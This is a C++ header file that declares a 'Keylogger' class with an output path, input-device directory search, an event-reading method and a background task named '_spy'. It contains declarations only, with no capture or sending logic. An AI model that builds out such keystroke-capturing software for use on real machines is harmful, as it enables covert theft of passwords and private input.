#ifndef KEYLOGGER_HPP_
#define KEYLOGGER_HPP_

#include <string>
#include <vector>
#include <future>

namespace kl
{

    class Keylogger
    {
    public:
        Keylogger(std::string output, bool debug, std::vector<std::string> inputDir);
        virtual ~Keylogger();

        void start();
        void readEvent();

    private:
        void _findInputFile(const std::vector<std::string> &);

    private:
        std::string _outputPath;
        bool _debug;
        std::string _input;
        std::future<void> _spy;
    };
}

#endif /* !KEYLOGGER_HPP_ */
